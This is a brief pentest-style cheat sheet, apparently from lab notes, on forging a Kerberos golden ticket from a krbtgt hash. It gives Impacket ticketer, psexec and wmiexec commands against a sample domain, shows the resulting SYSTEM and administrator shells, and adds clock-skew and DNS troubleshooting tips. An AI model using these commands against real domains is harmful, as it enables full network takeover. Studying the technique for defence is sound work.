When you have windows key signing ticket (i.e `krbtgt`) hash for user with domain sid in hand, this will help create golden ticket.

Requirement:
`domain sid` : `Get-ADDomain null.local`

usages:

``` shell
python ./tickter.py -nthash <NTLMHASH> -domain-sid <SID> -domain null.local administrator
export KRB5CCNAME=administrator.ccache
```

### pawn (local system)
```
./psexec.py null.local/administrator@null.local -k -no-pass

whoami
<nt authority\system>
```

### pawn (administrator)
```
./wmiexec.py null.local/administrator@null.local -k -no-pass

whoami
<null.local\administrator>
```

This works because domain already signed the ticket.

### Gotcha
1. DNS resolution: make sure AD `null.local` is resolvable while doing psexec.py
1. Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
	- nmap output can come handy here, as it shows clock-skew. Or,
	- check date itself in machine that we have access to.
	- update date to match machine, e.g: `date -s <time of 4 hours ago>
1. kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(server not found in kerberos database)
	- This is because impacket is looking for DNS instead of IP.
